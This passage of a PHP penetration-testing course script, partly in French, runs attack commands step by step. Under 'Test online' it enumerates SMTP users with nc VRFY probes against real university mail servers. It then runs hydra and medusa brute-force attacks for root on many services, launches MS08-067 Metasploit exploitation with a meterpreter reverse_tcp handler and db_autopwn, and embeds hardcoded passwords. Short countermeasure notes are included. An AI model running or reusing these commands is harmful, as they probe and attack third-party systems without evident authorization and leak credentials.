				echo "\033[01;32m " . traitement($head) . "\033[0m";
				fwrite($log, "$mail = $head\n");
			} else {
				echo "\033[01;36m$head \033[0m";
				echo "\033[01;32m " . traitement($head) . "\033[0m";
			}
		}
		fclose($log);
		$this->pause();
		$this->ssTitre("Nmap");
		$this->requette(" nmap --script \"smtp*\" -vvv $this->msf -p25 -n -Pn -vvv ");
		$this->pause();
		$this->ssTitre("Metasploit Enum SMTP");
		$this->requette(" msfcli scanner/smtp/smtp_enum RHOSTS=\"$this->msf\" O");
		$this->requette(" msfcli scanner/smtp/smtp_enum RHOSTS=\"$this->msf\" E");
		$this->pause();
		$this->titre("Test online");
	
		$this->requette("host -t mx univ-mosta.dz ");
		$this->requette("echo 'vrfy root' | nc `host -t mx univ-mosta.dz | cut -d' ' -f7` 25 -v");
		$this->requette("echo 'vrfy bin' | nc `host -t mx univ-mosta.dz | cut -d' ' -f7` 25 -v");
		$this->requette("echo 'vrfy guest' | nc `host -t mx univ-mosta.dz | cut -d' ' -f7` 25 -v");
		$this->requette("echo 'vrfy admin' | nc `host -t mx univ-mosta.dz | cut -d' ' -f7` 25 -v");
		$this->pause();
		$this->requette("host -t mx univ-biskra.dz ");
		$this->requette("echo 'vrfy root' | nc mail.univ-biskra.dz 25 -v");
		$this->requette("echo 'vrfy bin' | nc mail.univ-biskra.dz 25 -v");
		$this->requette("echo 'vrfy guest' | nc mail.univ-biskra.dz 25 -v");
		$this->requette("echo 'vrfy admin'| nc mail.univ-biskra.dz 25 -v");
		$this->pause();
		$this->article("TP", "Find domain which id possible to exploit SMTP vrfy");
		$this->pause();
		$this->cmd("localhost", "for i in `cat $this->dir_tools/hosts/axfr.hosts`; do echo -e \"\r\tvrfy root\" | nc `host -t mx $i | cut -d' ' -f7` 25 -v;done");
	
	
		$this->article("SMTP Enumeration Countermeasures", "This is another one of those oldie-but-goodie services that should just be turned off.\nVersions of the popular SMTP server software sendmail (www.sendmail.org) greater
than 8 offer syntax that can be embedded in the mail.cf file to disable these commands or require authentication. \nMicrosoft’s Exchange Server prevents nonprivileged users from using EXPN and VRFY by default in more recent versions. Other SMTP server implementations should offer similar functionality. \nIf they don’t, consider switching vendors! ");
		$this->requette("echo 'vrfy root' | nc `host -t mx univ-setif.dz | cut -d' ' -f7` 25 -v");
		$this->pause();
	
	
		/*
		 * Brute-force Attack Countermeasure
		 * The best defense for brute-force guessing is to use strong passwords that are not easily
		 * guessed. A one-time password mechanism would be most desirable. Some free utilities
		 * that will help make brute forcing harder to accomplish are listed in Table 5-1.
		 * Newer UNIX operating systems include built-in password controls that alleviate
		 * some of the dependence on third-party modules. For example, Solaris 10 provides a
		 * number of options through /etc/default/passwd to strengthen a systems password
		 * policy including:
		 * • PASSLENGTH Minimum password length
		 * • MINWEEK Minimum number of weeks before a password can be changed
		 * • MAXWEEK Maximum number of weeks before a password must be changed
		 * • WARNWEEKS Number of weeks to warn a user ahead of time their password is about to expire
		 * • HISTORY Number of passwords stored in password history.
		 * User will not be allowed to reuse these values
		 * • MINALPHA Minimum number of alpha characters
		 * • MINDIGIT Minimum number of numerical characters
		 * • MINSPECIAL Minimum number of special characters (nonalpha,nonnumeric)
		 * • MINLOWER Minimum number of lowercase characters
		 * • MINUPPER Minimum number of uppercase characters
		 *
		 * The default Solaris install does not provide support for pam_cracklib or pam_
		 * passwdqc. If the OS password complexity rules are insufficient, then one of the PAM
		 *
		 * modules can be implemented. Whether you rely on the operating system or third-party
		 * products, it is important that you implement good password management procedures
		 * and use common sense. Consider the following:
		 * • Ensure all users have a password that conforms to organizational policy.
		 * • Force a password change every 30 days for privileged accounts and every
		 * 60 days for normal users.
		 * • Implement a minimum password length of eight characters consisting of at
		 * least one alpha character, one numeric character, and one nonalphanumeric
		 * character.
		 * • Log multiple authentication failures.
		 * • Configure services to disconnect clients after three invalid login attempts.
		 * • Implement account lockout where possible. (Be aware of potential denial of
		 * service issues of accounts being locked out intentionally by an attacker.)
		 * • Disable services that are not used.
		 * • Implement password composition tools that prohibit the user from choosing a
		 * poor password.
		 * • Don’t use the same password for every system you log into.
		 * • Don’t write down your password.
		 * • Don’t tell your password to others.
		 * • Use one-time passwords when possible.
		 * • Don’t use passwords at all. Use public key authentication.
		 * • Ensure that default accounts such as “setup” and “admin” do not have default
		 * passwords.
		 *
		 */
	
		// dico: all.lst (12Go)
		$this->titre("Entrer par la Grande Porte");
		$this->net("http://lastbit.com/password-recovery-methods.asp#Brute%20Force%20Attack");
		$this->net("http://www.lockdown.co.uk/?pg=combi");
		$this->net("http://password-checker.online-domain-tools.com/");
		$this->pause();
		$this->titre("default Password");
		$this->net("http://www.defaultpassword.com/");
		$this->net("http://www.passwordmeter.com/");
		$this->net("http://www.zip-password-cracker.com/dictionaries.html");
		$this->pause();
		$this->cmd("localhost", "wc -l $this->dir_tools/dico/2M_passwd.lst");
		$this->pause();
		$this->chapitre("Dictionnary Attack on authentication");
		$this->requette("medusa -d");
		$this->pause();
		$this->requette("hydra -h");
		$this->pause();
		$this->ssTitre("Dicionnary");
		$this->requette("gedit /opt/metasploit/apps/pro/msf3/data/wordlists/unix_users.txt");
		$this->pause();
		$this->ssTitre("FTP");
		$this->cmd("localhost", "hydra -l root -P /opt/metasploit/apps/pro/msf3/data/wordlists/unix_users.txt $this->msf ftp -V");
		$this->pause();
		$this->ssTitre("SSH");
		$this->cmd("localhost", "hydra -l root -P /opt/metasploit/apps/pro/msf3/data/wordlists/unix_users.txt $this->msf ssh -V");
		$this->pause();
		$this->ssTitre("Telnet");
		$this->cmd("localhost", "hydra -l root -P /opt/metasploit/apps/pro/msf3/data/wordlists/unix_users.txt $this->msf telnet -V");
		$this->pause();
		$this->ssTitre("SMTP");
		$this->cmd("localhost", "hydra -l root -P /opt/metasploit/apps/pro/msf3/data/wordlists/unix_users.txt $this->msf smtp -V");
		$this->pause();
		$this->ssTitre("MYSQL");
		$this->cmd("localhost", "medusa -M mysql -h $this->msf -u root -P \"/opt/metasploit/apps/pro/msf3/data/wordlists/unix_users.txt\" -f -v 6");
		$this->pause();
		$this->ssTitre("Postgresql");
		$this->cmd("localhost", "hydra -l root -P /opt/metasploit/apps/pro/msf3/data/wordlists/unix_users.txt $this->msf postgres -V");
		$this->pause();
		$this->ssTitre("IMAP");
		$this->cmd("localhost", "hydra -l root -P /opt/metasploit/apps/pro/msf3/data/wordlists/unix_users.txt $this->msf imap -V");
		$this->pause();
		$this->ssTitre("VNC");
		$this->cmd("localhost", "hydra -P /opt/metasploit/apps/pro/msf3/data/wordlists/unix_users.txt $this->msf vnc -V");
		$this->pause();
		$this->cmd("localhost", " msfcli auxiliary/scanner/vnc/vnc_login RHOSTS=$this->msf E");
		$this->pause();
		$this->cmd("localhost", "vncviewer $this->msf:5900 -> pass: password");
		$this->pause();
		$this->ssTitre("SMB");
		$this->cmd("localhost", "medusa -M smbnt -h $this->msf -u root -P \"/opt/metasploit/apps/pro/msf3/data/wordlists/unix_users.txt\" -f -v 6");
		$this->pause();
		$this->cmd("localhost", "hydra -l root -P /opt/metasploit/apps/pro/msf3/data/wordlists/unix_users.txt $this->msf smb -V");
		$this->pause();
		$this->ssTitre("LDAP");
		$this->cmd("localhost", "hydra -l admin -P /opt/metasploit/apps/pro/msf3/data/wordlists/unix_users.txt $win08 ldap -V");
		$this->pause();
		// nmap -p 389 --script ldap-brute --script-args ldap.base='"cn=users,dc=cqure,dc=net"' <host>
		$this->titre("File Buckup");
		$this->article("looking for files", "config.inc.php~ / .bak / .save");
		$this->requette(" nmap -Pn -n -p \"http*\" -vvv -sC http-backup-finder $this->msf ");
		$this->pause();
	
		$this->chapitre("Social Engineering");
		$this->article("Le Social Engineering", " une attaque de persuasion");
		$this->pause();
		$this->article("Introduction", "Le Social Engineering dit SE est une technique de manipulation psychologique humaine qui sert à obtenir \"invisiblement\" des informations d'une personne ciblée. Cela nécessite pas d'énormes connaissances informatiques, mais nécessite de s'adapter à la victime suivant le type de l'attaque du SE (Niveau de langage, apparence, charisme, persuasion, savoir mentir) c'est-à-dire apprendre à exploiter les failles humaines (confiance, manque d'informations).\nCette méthode, le SE, peut aussi servir aux personnes mal attentionné de vous infecter (Malware, Spyware, etc) ou encore servir au phishing qui est en partie une attaque de SE.");
		$this->pause();
	
		$this->titre("Maltego");
		$this->net("http://www.canariproject.com/");
		$this->pause();
		$this->cmd("localhost", "maltego_chlorine_ce");
		$this->pause();
		$this->notify("END Enumering Target");
	}
	// #################################################################
	
	
	
	
	
	
	
	
	public function vuln2scan(){
	    $this->vuln2scan4gui4nessus();
	    $this->vuln2scan4gui4nexpose();
	    $this->vuln2scan4gui4openvas();
	}
	
	
	public function vuln2scan4gui4nessus(){
	    $this->ssTitre(__FUNCTION__);
	    $file_output = "$this->rep_path/$this->ip.$this->vhost.$this->port.".__FUNCTION__;
	    $this->article("login/password","rohff/rohff");
	    $this->ssTitre("Mise a jours de Nessus");
	    $this->cmd("localhost","echo '$this->root_passwd' | sudo -S /opt/nessus/sbin/nessuscli update");pause();
	    $this->ssTitre("Start Nessus");
	    $this->cmd("localhost","echo '$this->root_passwd' | sudo -S /etc/init.d/nessusd start");pause();
	    $this->net("https://localhost:8834/nessus6.html");pause();
	}
	
	
	public function vuln2scan4gui4nexpose(){
	    $this->ssTitre(__FUNCTION__);
	    $this->cmd("localhost","cd /opt/rapid7/nexpose/nsc; sudo ./nsc.sh");
	    $this->article("login/password","rohff/rafik3615#");
	    $this->net("http://localhost:3780/manager/html");
	    $this->pause();
	}
	
	
	public function vuln2scan4gui4openvas(){
	    $this->ssTitre(__FUNCTION__);
	    $this->cmd("localhost","echo '$this->root_passwd' | sudo -S service openvas-server start");
	    $this->requette("echo -e \"Waiting 120s\" ");
	    sleep(60);
	    $this->requette("echo '$this->root_passwd' | sudo -S netstat -anp | grep LISTEN | grep -i 'openvas'");
	    $this->requette("echo -e \"Connect to openvas-server via openvas-client\" ");
	    $this->cmd("localhost","openvas-client");
	    $this->pause();
	}
	
	
	
	public function poc4Exploit4Vuln(){
	    $this->chapitre("Exploitation de vulnerabilité Reseaux");
	    $this->titre("With CVE");
	    $this->ssTitre("Exploitation de vulnerabilite via des Scripts");
	    // search et exploitation de qlq exploit
	    $this->net("http://vulnerability-lab.com");
	    $this->net("http://packetstormsecurity.org/files/tags/exploit/");
	    $this->net("http://www.exploit-db.com/");
	    $this->pause();
	    $this->ssTitre("Vulnerabilité MS08_067");
	    $this->net("http://labs.portcullis.co.uk/application/ms08-067-check/");
	    $this->ssTitre("Check Vulnerabilite with nmap");
	    $this->cmd("localhost", "echo '$this->root_passwd' | sudo -S nmap --script-updatedb");
	    $this->pause();
	    $this->requette("echo '$this->root_passwd' | sudo -S nmap --script smb-check-vulns.nse --script-args=unsafe=1 -vvv -n -p 445 $this->xp");
	    $this->pause();
	    $this->cmd("localhost", "python $this->dir_tools/enum/ms08-067_check-0.6/ms08-067_check.py -t $this->xp ");
	    $this->pause();
	    $this->requette("echo '$this->root_passwd' | sudo -S wget https://raw.githubusercontent.com/pwnieexpress/metasploit-framework/master/modules/auxiliary/scanner/smb/ms08_067_check.rb -O /opt/metasploit/apps/pro/msf3/modules/auxiliary/scanner/smb/ms08_067_check.rb ");
	    $this->cmd("localhost", "echo '$this->root_passwd' | sudo -S msfcli auxiliary/scanner/smb/ms08_067_check RHOSTS=10.50.10.0/24 E");
	    $this->pause();
	    $this->cmd("localhost", "echo '$this->root_passwd' | sudo -S nmap --script vuln -vvv $this->xp $this->msf $this->owasp $dvl $this->win7 $win08 -n");
	    $this->pause();
	    $this->net("http://www.exploit-db.com/exploits/6841/");
	    $this->pause();
	    $this->ssTitre("MS08_067 via msfcli");
	    $this->net("http://www.metasploit.com/modules/exploit/windows/smb/ms08_067_netapi");
	    $this->ssTitre("HELP");
	    $this->requette("echo '$this->root_passwd' | sudo -S msfcli -h");
	    $this->ssTitre("Summary");
	    $this->article("Summary", "Show information about this module");
	    $this->requette("echo '$this->root_passwd' | sudo -S msfcli exploit/windows/smb/ms08_067_netapi S");
	    $this->pause();
	    $this->ssTitre("Options");
	    $this->article("Options", "Show available options for this module");
	    $this->requette("echo '$this->root_passwd' | sudo -S msfcli exploit/windows/smb/ms08_067_netapi O");
	    $this->pause();
	    $this->ssTitre("Advanced Options");
	    $this->article("Advanced Options", "Show Advanced options for this module");
	    $this->requette("echo '$this->root_passwd' | sudo -S msfcli exploit/windows/smb/ms08_067_netapi A");
	    $this->pause();
	    $this->ssTitre("IDS Evasion");
	    $this->article("IDS Evasion", "Show available ids evasion options for this module");
	    $this->requette("echo '$this->root_passwd' | sudo -S msfcli exploit/windows/smb/ms08_067_netapi I");
	    $this->pause();
	    $this->ssTitre("Payloads");
	    $this->article("Payloads", "Show available Payloads for this module");
	    $this->requette("echo '$this->root_passwd' | sudo -S msfcli exploit/windows/smb/ms08_067_netapi P");
	    $this->pause();
	    $this->ssTitre("Targets");
	    $this->article("Targets", "Show available Targets for this exploit module");
	    $this->requette("echo '$this->root_passwd' | sudo -S msfcli exploit/windows/smb/ms08_067_netapi T");
	    $this->pause();
	    $this->ssTitre("ACtions");
	    $this->article("Actions", "Show available Actions for this auxiliary module");
	    $this->requette("echo '$this->root_passwd' | sudo -S msfcli exploit/windows/smb/ms08_067_netapi AC");
	    $this->pause();
	    $this->ssTitre("Check");
	    $this->article("Check", "run the check routine of the selected module");
	    $this->requette("echo '$this->root_passwd' | sudo -S msfcli exploit/windows/smb/ms08_067_netapi RHOST=\"$this->xp\" TARGET=25 C");
	    $this->pause();
	    $this->ssTitre("Execute");
	    $this->article("Execute", "Execute the selected module");
	    $this->cmd("localhost", "echo '$this->root_passwd' | sudo -S msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST=localhost LPORT=4444 E");
	    $this->cmd("localhost", "echo '$this->root_passwd' | sudo -S msfcli exploit/windows/smb/ms08_067_netapi RHOST=\"$this->xp\" TARGET=49 E");
	    $this->pause();
	    $this->titre("Metasploit");
	    $this->ssTitre("msfconsole -q");
	    $this->cmd("localhost", "wget https://raw.github.com/jedivind/metasploit-framework/autopwn-modules/plugins/db_autopwn.rb");
	    $this->cmd("localhost", "echo '$this->root_passwd' | sudo -S cp -v $this->dir_tools/enum/db_autopwn.rb /opt/metasploit/apps/pro/plugins/");
	    $query = "echo \"db_status\n db_nmap -sS -p139,445 $this->xp\n load /opt/metasploit/apps/pro/plugins/db_autopwn.rb\n db_autopwn -p -x -e -t -r\n\" > $this->dir_tmp/autopwn_xp.rc; cat $this->dir_tmp/autopwn_xp.rc";
	    $this->requette($query);
	    $this->pause();
	    $this->cmd("localhost", "echo '$this->root_passwd' | sudo -S msfconsole -q -r $this->dir_tmp/autopwn_xp.rc -y /opt/metasploit/apps/pro/ui/config/database.yml");
	    $this->pause();
	    $query = "echo \"db_status\n db_import $this->dir_tmp/pentest_tcp_ports.xml\n load /opt/metasploit/apps/pro/plugins/db_autopwn.rb\n db_autopwn -p -x -e -t -r\n\" > $this->dir_tmp/autopwn_hosts.rc; cat $this->dir_tmp/autopwn_hosts.rc";
	    $this->requette($query);
	    $this->pause();
	    $this->cmd("localhost", "echo '$this->root_passwd' | sudo -S msfconsole -q -r $this->dir_tmp/autopwn_hosts.rc -y /opt/metasploit/apps/pro/ui/config/database.yml");
	    $this->pause();
	    $this->ssTitre("Importing Nmap Results Into Metasploit");
	    $this->cmd("localhost", "nmap -Pn -sS -A $this->msf -oX $this->dir_tmp/nmap_msf");
	    $query = "echo -e \"db_status\ndb_import $this->dir_tmp/nmap_msf.xml\ndb_hosts -c address,os_flavor \n\" > $this->dir_tmp/rsm_nmap.rc; cat $this->dir_tmp/rsm_nmap.rc";
	    $this->requette($query);
	    $this->pause();
	    $this->cmd("localhost", "echo '$this->root_passwd' | sudo -S msfconsole -q -r $this->dir_tmp/rsm_nmap.rc -y /opt/metasploit/apps/pro/ui/config/database.yml");
	    $this->pause();
	    $this->ssTitre("connect nessus with metasploit console");
	    $query = "echo  \"db_status\n load nessus\n nessus_connect prof:rohff@$this->prof:8834 ok\n nessus_server_status\n nessus_admin\n nessus_plugin_list\n nessus_policy_list\n nessus_report_list \" > $this->dir_tmp/nessus_connect.rc; cat $this->dir_tmp/nessus_connect.rc";
	    $this->requette($query);
	    $this->pause();
	    // nessus_report_get <UDI>
	    $this->cmd("localhost", "echo '$this->root_passwd' | sudo -S msfconsole -q -r $this->dir_tmp/nessus_connect.rc -y /opt/metasploit/apps/pro/ui/config/database.yml");
	    $this->pause();
	    $this->ssTitre("load nessus");
	    $query = "echo -e \"db_status\nload nessus\ndb_import $this->dir_tmp/rsm_nessus.nessus\ndb_hosts -c address,svcs,vulns\ndb_autopwn -p -x -e -t -r\n\" > $this->dir_tmp/rsm_nessus.rc; cat $this->dir_tmp/rsm_nessus.rc";
	    $this->requette($query);
	    $this->pause();
	    $this->cmd("localhost", "echo '$this->root_passwd' | sudo -S msfconsole -q -r $this->dir_tmp/rsm_nessus.rc -y /opt/metasploit/apps/pro/ui/config/database.yml");
	    $this->pause();
	    $this->ssTitre("load nexpose");
	    $query = "echo -e \"db_status\nload nexpose\ndb_import $this->dir_tmp/rsm_nexpose.xml\ndb_hosts -c address,svcs,vulns\ndb_autopwn -p -x -e -t -r\n\" > $this->dir_tmp/rsm_nexpose.rc; cat $this->dir_tmp/rsm_nexpose.rc";
	    $this->requette($query);
	    $this->pause();
	    
	    $this->cmd("localhost", "echo '$this->root_passwd' | sudo -S msfconsole -q -r $this->dir_tmp/rsm_nexpose.rc -y /opt/metasploit/apps/pro/ui/config/database.yml");
	    $this->pause();
	    
	    $this->ssTitre("Armitage"); // Armitage -> Pivot
	    $this->net("http://www.fastandeasyhacking.com/manual");
	    $this->cmd("localhost", "svn checkout http://armitage.googlecode.com/svn/trunk/ armitage-read-only");
	    $this->article("localhost", "go to msfconsole -q\n db_connect -y /opt/metasploit/apps/pro/ui/config/database.yml");
	    $this->requette("cat /opt/metasploit/apps/pro/ui/config/database.yml");
	    $this->cmd("localhost", "echo '$this->root_passwd' | sudo -S java -jar $this->dir_tools/enum/armitage.jar");
	    $this->article("SEE", "Pivoting");
	    $this->pause();
	    //tp_nc_pivo_simulation ();
	    $this->pause();
	    $this->requette("echo '$this->root_passwd' | sudo -S /etc/init.d/nessusd stop");
	    $this->cmd("localhost", "echo '$this->root_passwd' | sudo -S pkill openvassd && sudo pkill openvasmd && sudo pkill openvasad");
	    $this->cmd("localhost", "echo '$this->root_passwd' | sudo -S pkill nexserv");
	    $this->pause();
	}
	
	
	public function poc4IdentVuln(){
	    $this->chapitre("0x040000 Identification de Vuln");
	    
	    $this->gtitre("Scanneur de Vulnerabilite");
	    $this->titre("Nessus"); // login/password: rohff/rohff
	    $this->net("http://www.tenable.com/products/nessus/select-your-operating-system");
	    $this->cmd("echo '$this->root_passwd' | sudo -S dpkg -i /home/rohff/EH/INSTALL/ub/Nessus-6.5.5-ubuntu1110_amd64.deb");
	    $this->ssTitre("Start Nessus");
	    $this->cmd("localhost", "echo '$this->root_passwd' | sudo -S /etc/init.d/nessusd start");
	    $this->pause();
	    $this->net("https://localhost:8834/nessus6.html");
	    $this->pause(); // rohff/rohff
	    $this->pause();
	    $this->ssTitre("Mise a jours de Nessus");
	    $this->cmd("localhost", "echo '$this->root_passwd' | sudo -S /opt/nessus/sbin/nessuscli update ");
	    $this->pause();
	    
	    $this->net("http://static.tenable.com/documentation/nmapxml.nasl");
	    $this->cmd("localhost", "cp -v $this->dir_tools/enum/nmapxml.nasl /opt/nessus/lib/nessus/plugins/");
	    $this->pause();
	    
	    $this->ssTitre("About CVE");
	    $this->net("http://www.cvedetails.com/");
	    $this->net("http://web.nvd.nist.gov/view/vuln/search");
	    $this->net("http://cve.mitre.org");
	    $this->pause();
	    
	    $this->article("Rapport", " -> $this->dir_tmp/rsm_nessus.nbe");
	    $this->pause();
	    
	    $this->titre("Nexpose"); // login/password: nxadmin/nxpassword
	    $this->article("nexpose", "NexposeVA.ova -> VirtualBox");
	    $this->cmd("localhost", "cd /opt/rapid7/nexpose/nsc; sudo ./nsc.sh");
	    $this->pause();
	    $this->article("login/password", "nxadmin/nxpassword");
	    $this->net("https://" . gethostbyname($this->prof) . ":3780");
	    $this->net("http://$this->msf:3780/manager/html");
	    $this->article("username/password", "tomcat/tomcat");
	    $this->pause();
	    $this->article("Rapport", " -> $this->dir_tmp/rsm_nexpose.nbe");
	    $this->pause();
	    
	    $this->titre("Core IMPACT");
	    $this->titre("sapyto");
	}
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
}
?>

